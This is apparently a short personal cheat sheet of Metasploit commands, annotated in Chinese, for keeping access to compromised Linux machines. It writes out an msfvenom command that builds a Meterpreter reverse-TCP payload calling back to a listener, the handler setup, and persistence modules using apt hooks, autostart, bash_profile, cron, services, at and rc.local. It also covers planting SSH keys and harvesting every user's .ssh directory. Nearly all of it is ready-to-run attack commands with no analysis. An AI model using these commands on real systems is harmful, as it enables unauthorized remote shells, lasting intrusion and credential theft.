```
msfvenom -p linux/x64/meterpreter/reverse_tcp  lhost=192.168.42.129 lport=9999 -f elf > 123

use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost 192.168.42.129
set lport 9999
exploit -j

```



```
exploit/linux/local/apt_package_manager_persistence
apt update反向连接
set AllowNoCleanup true
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost 192.168.42.129
set lport 4444
ls -tr
```

```
exploit/linux/local/autostart_persistence
有效负载将在用户登录时执行
cmd/unix/reverse_netcat
https://blog.csdn.net/COCO56/article/details/107628019
root本地登录生效
```

```
exploit/linux/local/bash_profile_persistence 
每当目标用户打开 Bash 终端时，执行触发器就会执行回调负载
```

```
 exploit/linux/local/cron_persistence 
 此模块将创建一个 cron 或 crontab 条目来执行有效负载。该模块包括自动清理这些条目以防止多次执行的功能。系统日志将获得 cron 条目的副本。
```

```
post/linux/manage/sshkey_persistence：此模块将向指定用户（或全部）添加 SSH 密钥
use post/linux/manage/sshkey_persistence
set SESSION session-id
exploit

use auxiliary/scanner/ssh/ssh_login_pubkey 
set rhosts 192.168.1.190
set key_path /root/.msf4/loot/
set username test
run

.ssh目录的权限必须是700
authorized_keys文件权限必须是600
xshell密钥登录

post/multi/gather/ssh_creds:此模块将收集目标计算机上所有用户的 .ssh 目录的内容
use post/multi/gather/ssh_creds
set SESSION session-id
exploit
```

```
exploit/linux/local/service_persistence 
此模块将在框中创建一个服务，并将其标记为自动重新启动。我们需要足够的访问权限来写入服务文件并可能重新启动服务 目标
```

```
exploit/unix/local/at_persistence 
此模块通过 at（1） 执行有效负载来实现持久性。
```

```
 exploit/linux/local/rc_local_persistence
 此模块将编辑 /etc/rc.local 以保留有效负载。有效负载将在下次重新启动时执行。
```

